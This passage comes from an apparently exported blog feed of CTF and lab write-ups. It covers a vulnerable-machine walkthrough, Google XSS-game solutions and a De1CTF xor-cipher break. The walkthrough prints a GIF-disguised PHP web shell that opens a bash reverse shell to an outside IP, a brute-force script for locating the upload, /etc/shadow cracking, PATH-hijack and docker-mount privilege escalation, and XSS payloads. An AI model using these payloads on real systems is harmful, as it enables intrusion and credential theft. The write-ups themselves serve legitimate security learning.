class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">	<span class="keyword">if</span>($check[<span class="string">"mime"</span>] == <span class="string">"image/png"</span> || $check[<span class="string">"mime"</span>] == <span class="string">"image/gif"</span>)&#123;</span><br><span class="line">		$uploadOk = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$uploadOk = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">":)"</span>;</span><br><span class="line">	&#125; </span><br><span class="line">  <span class="keyword">if</span>($uploadOk == <span class="number">1</span>)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file.<span class="string">"."</span>.$imageFileType);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"File uploaded /uploads/?"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>as you can see, this waf only check out the <code>mime</code> , which can be passed with <code>GIF89a</code> as a header of any file. And the second question is : how to visit our <code>php</code> file uploaded?. The answer is <code>brute force</code> as there is only 100 possibilities of stored filename.</p>
<p>shell.php:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">exec(<span class="string">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.108/9998 0&gt;&amp;1'"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>-i </code>means <code>interactive</code> ,and <code>&gt;&amp;</code> is another expression of <code>1&gt;filename 2&gt;&amp;1</code> or <code>2&gt;filname 1&gt;&amp;2</code>, which is equal to <code>&amp;&gt;</code>.<br>
<code>0&gt;&amp;1</code>means redirecting the stdin to stdout, in this case , <code>stdin</code> ,<code>stdout</code> and <code>stderr</code> have all been redirect to us, thus we got a shell.</p>
<p>see the link below:</p>
<p><a href="https://superuser.com/questions/436586/why-redirect-output-to-21-and-12" target="_blank" rel="noopener">https://superuser.com/questions/436586/why-redirect-output-to-21-and-12</a></p>
<p><a href="https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01</a></p>
<p><a href="https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean" target="_blank" rel="noopener">https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean</a></p>
<p>and another script to visit the <code>shell.php</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">filename = <span class="string">'shell.php'</span></span><br><span class="line">url = <span class="string">'http://172.28.18.114:8000/uploads/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    target = url + hashlib.md5(filename + str(i)).hexdigest() + <span class="string">'.php'</span></span><br><span class="line">    <span class="keyword">print</span> target</span><br><span class="line">    res = requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Not'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">print</span> target</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'not found'</span></span><br></pre></td></tr></table></figure>
<p>Meanwhile open our <code>nc -lvvkp 9998</code> on our server, and wait for the shell…</p>
<p>But <code>www-data</code> is a low-right user. So, ckeck out enabled-execution by using <code>find / -perm -4000 2&gt;/dev/null</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57026887-70ba3f80-6c6d-11e9-8d0d-490bbd3fc84e.png" alt="Screenshot from 2019-05-01 23-02-01"></p>
<p>and read <code>/etc/shadow</code> using <code>tail</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57026962-9fd0b100-6c6d-11e9-983b-a7e2727773ae.png" alt="Screenshot from 2019-05-01 23-03-05"></p>
<p>copy the line start with <code>root</code> into a file and use <code>john {filename} --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027064-f5a55900-6c6d-11e9-951a-5b427989dac1.png" alt="Screenshot from 2019-05-01 23-05-07"></p>
<p>try<code>su</code> but failed with error message <code>su: must be run from a terminal</code>.<br>
So~,we can use python to convert it to a terminal by using command as follows:</p>
<p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
<p>then <code>su</code> could be used. Now check the <code>/root/flag</code>, which echos …<code>Life consists of details</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027318-a9a6e400-6c6e-11e9-8cc8-cbf9548e7e4f.png" alt="Screenshot from 2019-05-01 23-09-32"></p>
<p>Remember we got to know the website was built based on <code>wordpress</code>? Check the <code>/var/www/html/wp-config.php</code> and we got this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(&apos;DB_USER&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&apos;DB_PASSWORD&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define(&apos;DB_HOST&apos;, &apos;db:3306&apos;);</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line">define(&apos;DB_CHARSET&apos;, &apos;utf8&apos;);</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don&apos;t change this if in doubt. */</span><br><span class="line">define(&apos;DB_COLLATE&apos;, &apos;&apos;);</span><br></pre></td></tr></table></figure>
<p>as the website server and database was seperated ,we should visit database as if it was a remote host:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -h db -uwordpress -pwordpress</span><br><span class="line"></span><br><span class="line">show databases;</span><br><span class="line">use wordpress;</span><br><span class="line">show tables;</span><br><span class="line">select * from host_ssh_cred;</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/57027323-aca1d480-6c6e-11e9-99d7-f2e8d00f0dc2.png" alt="Screenshot from 2019-05-01 23-20-59"></p>
<p>md5:<code>e10adc3949ba59abbe56e057f20f883e</code>,let’s crack it.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027486-14581f80-6c6f-11e9-901c-7a631e5110d7.png" alt="Screenshot from 2019-05-01 23-23-19"></p>
<p><code>ssh hummingbirdscyber@172.28.18.114</code> and type our password:123456 to login.</p>
<h3 id="solution-1">solution 1</h3>
<p>try <code>find / -perm -u=s 2&gt;/dev/null</code> to find</p>
<blockquote>
<p>find the permission with SUID has been set, SUID will give the owner’s permission to the user who execute this file.</p>
</blockquote>
<p><img src="https://user-images.githubusercontent.com/40637063/57027536-3a7dbf80-6c6f-11e9-9ece-33412b2a9c57.png" alt="Screenshot from 2019-05-01 23-32-23"></p>
<p>and try to execute the <code>a.out</code>,we got <code>root</code> as output.</p>
<p>when trying to got to know the contant of the file, <code>cat</code> will display messy code ,while <code>strings</code> can display normally.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027553-47021800-6c6f-11e9-8f34-08b8ca573de9.png" alt="Screenshot from 2019-05-01 23-32-33"></p>
<p>Noticed?,there is <code>whoami</code> ,which leads to the output <code>root</code>, so when we execute the <code>a.out</code>, our permission has become <code>root</code> <a href="http://temporarily.As" target="_blank" rel="noopener">temporarily.As</a> <code>whoami</code> is a system function which system PATH will involved in when it was executed. <code>function hijacked</code> could be implement.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; /tmp/whoami</span><br><span class="line">chmod 777 /tmp/whoami</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure>
<blockquote>
<p>why create our <code>whoami</code> in <code>/tmp</code>? because every users has full right under this director.</p>
</blockquote>
<p>so , <code>root</code> open a bash, and we can visit <code>/root</code> on it.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027755-d6a7c680-6c6f-11e9-810e-5f6adb04337c.png" alt="Screenshot from 2019-05-02 00-18-27"></p>
<h3 id="solution-2">solution 2</h3>
<p><code>id</code> shows that we can use command <code>docker</code>, and we are <code>root</code> in the docker container. So, why not mapping our target folder to files in docker?just like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images # and we found there is a ubuntu image</span><br><span class="line">docker run -it /:/root ubuntu</span><br></pre></td></tr></table></figure>
<p>By visiting <code>/root/root/flag</code>, we got flag.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57027508-20dc7800-6c6f-11e9-9e1b-8839efc59354.png" alt="Screenshot from 2019-05-01 23-29-41"></p>
]]></content>
      <categories>
        <category>靶机渗透</category>
      </categories>
  </entry>
  <entry>
    <title>Google_Game</title>
    <url>/2019/06/12/Google-Game/</url>
    <content><![CDATA[<h1>Google Xss game</h1>
<h3 id="Level-3">Level 3</h3>
<p><img src="https://user-images.githubusercontent.com/40637063/58802751-83df7700-8640-11e9-8bfc-886723f4ed66.png" alt="image"></p>
<p>This website provides some API (after the arch pointer).</p>
<p>solution:</p>
<figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### level 4</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58806619-2b60a780-8649-11e9-8fa4-2f75a62e5e1b.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span><br><span class="line">    &lt;script src=&quot;/static/game-frame.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/game-frame-styles.css&quot; /&gt;</span><br><span class="line"> </span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function startTimer(seconds) &#123;</span><br><span class="line">        seconds = parseInt(seconds) || 3;</span><br><span class="line">        setTimeout(function() &#123; </span><br><span class="line">          window.confirm(&quot;Time is up!&quot;);</span><br><span class="line">          window.history.back();</span><br><span class="line">        &#125;, seconds * 1000);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body id=&quot;level4&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;/static/logos/level4.png&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&apos;&#123;&#123; timer &#125;&#125;&apos;);&quot; /&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;div id=&quot;message&quot;&gt;Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>solution:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xss-game.appspot.com/level4/frame?timer=&apos;);alert(&apos;</span><br></pre></td></tr></table></figure>
<h3 id="level-5">level 5</h3>
<p><img src="https://user-images.githubusercontent.com/40637063/58806063-edaf4f00-8647-11e9-91f6-ef3ce12e1a69.png" alt="image"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--signup.html--&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/static/game-frame.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/static/game-frame-styles.css"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">"level5"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/logos/level5.png"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- We're ignoring the email, but the poor user will never know! --&gt;</span></span><br><span class="line">    Enter email: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"reader-email"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; next &#125;&#125;"</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>solution:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure>
<p>and click the <code>Next</code> button.</p>
<h3 id="level-6">level 6</h3>
<p><img src="https://user-images.githubusercontent.com/40637063/58806432-c1480280-8648-11e9-8d7f-eb763e2a0757.png" alt="image"></p>
<p>This website allow user to execute alternative js script</p>
<p>solution:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://xss-game.appspot.com/level6/frame#data:text/plain,alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>crypto[working forever]</title>
    <url>/2019/04/22/crypto/</url>
    <content><![CDATA[<h2 id="De1ctf2019-xorzz">De1ctf2019 xorzz</h2>
<p>源码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#  from data import flag,plain</span></span><br><span class="line"></span><br><span class="line">plain = <span class="string">"dd"</span></span><br><span class="line">flag = <span class="string">"de1ctf&#123;testflag&#125;"</span></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key)&lt;<span class="number">38</span>)</span><br><span class="line"></span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line"></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si))) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure>
<p>首先将密文中的盐分去掉。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output=<span class="string">'49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c'</span></span><br><span class="line"></span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line"></span><br><span class="line">sa = cycle(salt)</span><br><span class="line">out = output.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">    res += chr(ord(i) ^ ord(next(sa)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#  print b64encode(res.encode('hex'))</span></span><br><span class="line"><span class="keyword">print</span> b64encode(res)</span><br></pre></td></tr></table></figure>
<p>去掉盐分之后，问题就变成了汉明文密码。原理见博客https://www.anquanke.com/post/id/161171#h2-0<br>
这里直接上脚本了。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"></span><br><span class="line">CHARACTER_FREQ = &#123;</span><br><span class="line">    <span class="string">'a'</span>: <span class="number">0.0651738</span>, <span class="string">'b'</span>: <span class="number">0.0124248</span>, <span class="string">'c'</span>: <span class="number">0.0217339</span>, <span class="string">'d'</span>: <span class="number">0.0349835</span>, <span class="string">'e'</span>: <span class="number">0.1041442</span>, <span class="string">'f'</span>: <span class="number">0.0197881</span>, <span class="string">'g'</span>: <span class="number">0.0158610</span>,</span><br><span class="line">    <span class="string">'h'</span>: <span class="number">0.0492888</span>, <span class="string">'i'</span>: <span class="number">0.0558094</span>, <span class="string">'j'</span>: <span class="number">0.0009033</span>, <span class="string">'k'</span>: <span class="number">0.0050529</span>, <span class="string">'l'</span>: <span class="number">0.0331490</span>, <span class="string">'m'</span>: <span class="number">0.0202124</span>, <span class="string">'n'</span>: <span class="number">0.0564513</span>,</span><br><span class="line">    <span class="string">'o'</span>: <span class="number">0.0596302</span>, <span class="string">'p'</span>: <span class="number">0.0137645</span>, <span class="string">'q'</span>: <span class="number">0.0008606</span>, <span class="string">'r'</span>: <span class="number">0.0497563</span>, <span class="string">'s'</span>: <span class="number">0.0515760</span>, <span class="string">'t'</span>: <span class="number">0.0729357</span>, <span class="string">'u'</span>: <span class="number">0.0225134</span>,</span><br><span class="line">    <span class="string">'v'</span>: <span class="number">0.0082903</span>, <span class="string">'w'</span>: <span class="number">0.0171272</span>, <span class="string">'x'</span>: <span class="number">0.0013692</span>, <span class="string">'y'</span>: <span class="number">0.0145984</span>, <span class="string">'z'</span>: <span class="number">0.0007836</span>, <span class="string">' '</span>: <span class="number">0.1918182</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_repeat_key</span><span class="params">(key,string)</span>:</span></span><br><span class="line">	key_len=len(key)</span><br><span class="line">	result=<span class="string">''</span></span><br><span class="line">	str_result=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> index,ch <span class="keyword">in</span> enumerate(string):</span><br><span class="line">		n=index%key_len</span><br><span class="line">		b=chr(ord(key[n])^ord(ch))</span><br><span class="line">		str_result+=b</span><br><span class="line">	<span class="keyword">return</span> str_result</span><br><span class="line"></span><br><span class="line"><span class="comment">#获得概率分数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score</span><span class="params">(string)</span>:</span></span><br><span class="line">	score=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">		char=char.lower()</span><br><span class="line">		<span class="keyword">if</span> char <span class="keyword">in</span> CHARACTER_FREQ:</span><br><span class="line">			score+=CHARACTER_FREQ[char]</span><br><span class="line">	<span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#将hex的每个字符与备选密钥进行xor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_xor</span><span class="params">(candidate_key,hex_string)</span>:</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> hex_string:</span><br><span class="line">		b=chr(candidate_key^ord(i))</span><br><span class="line">		result+=b</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#遍历备选密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Traversal_singlechar</span><span class="params">(hex_string)</span>:</span></span><br><span class="line">	candidate=[]</span><br><span class="line">	<span class="keyword">for</span> candidate_key <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		plaintext=single_xor(candidate_key,hex_string)</span><br><span class="line">		score=get_score(plaintext)</span><br><span class="line">		result=&#123;</span><br><span class="line">		<span class="string">'score'</span>:score,</span><br><span class="line">		<span class="string">'plaintext'</span>:plaintext,</span><br><span class="line">		<span class="string">'key'</span>:candidate_key</span><br><span class="line">		&#125;</span><br><span class="line">		candidate.append(result)</span><br><span class="line">	<span class="keyword">return</span> sorted(candidate,key=<span class="keyword">lambda</span> c:c[<span class="string">'score'</span>])[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(a_str,b_str)</span>:</span></span><br><span class="line">	dist=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a_str,b_str):</span><br><span class="line">		b=bin(ord(x)^ord(y)) <span class="comment">#转换为二进制（以字符串形式表示，如“0b100000”，0b表示二进制）</span></span><br><span class="line">		dist+=b.count(<span class="string">'1'</span>)</span><br><span class="line">	<span class="keyword">return</span> dist</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_keysize</span><span class="params">(string)</span>:</span></span><br><span class="line">	normals=[]</span><br><span class="line">	<span class="keyword">for</span> keysize <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">40</span>):</span><br><span class="line">		blocks=[]</span><br><span class="line">		cnt=<span class="number">0</span></span><br><span class="line">		distance=<span class="number">0</span></span><br><span class="line">		<span class="comment">#根据建议获得四个block，将这四个block两两得到hamming_distance。</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(string),keysize):</span><br><span class="line">			cnt+=<span class="number">1</span></span><br><span class="line">			blocks.append(string[i:i+keysize])</span><br><span class="line">			<span class="keyword">if</span> cnt==<span class="number">4</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		pairs=itertools.combinations(blocks,<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> (x,y) <span class="keyword">in</span> pairs:</span><br><span class="line">			distance+=hamming_distance(x,y)</span><br><span class="line">		<span class="comment">#平均一下</span></span><br><span class="line">		distance=distance/(<span class="number">6.0</span>)</span><br><span class="line">		<span class="comment">#Normalize this result by dividing by KEYSIZE.</span></span><br><span class="line">		normal_distance=distance/keysize</span><br><span class="line">		key=&#123;</span><br><span class="line">		<span class="string">'keysize'</span>:keysize,</span><br><span class="line">		<span class="string">'distance'</span>:normal_distance</span><br><span class="line">		&#125;</span><br><span class="line">		normals.append(key)</span><br><span class="line">		<span class="comment">#print key</span></span><br><span class="line">	<span class="comment">#选3个最小的为待选的keysize</span></span><br><span class="line">	candidate_keysize=sorted(normals,key=<span class="keyword">lambda</span> c:c[<span class="string">'distance'</span>])[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">	<span class="keyword">return</span> candidate_keysize</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_key</span><span class="params">(keysize,string)</span>:</span></span><br><span class="line">	now_str=<span class="string">''</span></span><br><span class="line">	key=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(keysize):</span><br><span class="line">		now_str=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> index,ch <span class="keyword">in</span> enumerate(string):</span><br><span class="line">			<span class="keyword">if</span> index%keysize==i:</span><br><span class="line">				now_str+=ch</span><br><span class="line">		<span class="comment">#获得key的第i位的值,转换为字符</span></span><br><span class="line">		<span class="comment">#print now_str</span></span><br><span class="line">		key+=chr(Traversal_singlechar(now_str)[<span class="string">'key'</span>])</span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plaint</span><span class="params">(string)</span>:</span></span><br><span class="line">	keysize_list=guess_keysize(string)</span><br><span class="line">	candidate_key=[]</span><br><span class="line">	possible_plaints=[]</span><br><span class="line">	<span class="keyword">for</span> keysize <span class="keyword">in</span> keysize_list:</span><br><span class="line">		key=guess_key(keysize[<span class="string">'keysize'</span>],string)</span><br><span class="line">		<span class="comment">#print key</span></span><br><span class="line">		possible_plaints.append((xor_repeat_key(key,string),key))</span><br><span class="line"></span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">	for i in possible_plaints:</span></span><br><span class="line"><span class="string">		print i[1]</span></span><br><span class="line"><span class="string">		print get_score(i[0].decode('hex'))</span></span><br><span class="line"><span class="string">		print len(i[0])</span></span><br><span class="line"><span class="string">		print i[0].decode('hex')</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> sorted(possible_plaints,key=<span class="keyword">lambda</span> c:get_score(c[<span class="number">0</span>]))[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">assert</span> hamming_distance(<span class="string">'this is a test'</span>, <span class="string">'wokka wokka!!!'</span>) == <span class="number">37</span></span><br><span class="line">	contents=open(<span class="string">'6.txt'</span>).read()</span><br><span class="line">	<span class="comment">#base64解码</span></span><br><span class="line">	string=str(contents).decode(<span class="string">'base64'</span>)</span><br><span class="line">	result=get_plaint(string)</span><br><span class="line">	<span class="keyword">print</span> result[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">print</span> result[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>6.txt中的内容是去盐分之后的密文base64之后的内容。</p>
<p>再附上hctf2018中天枢的脚本</p>
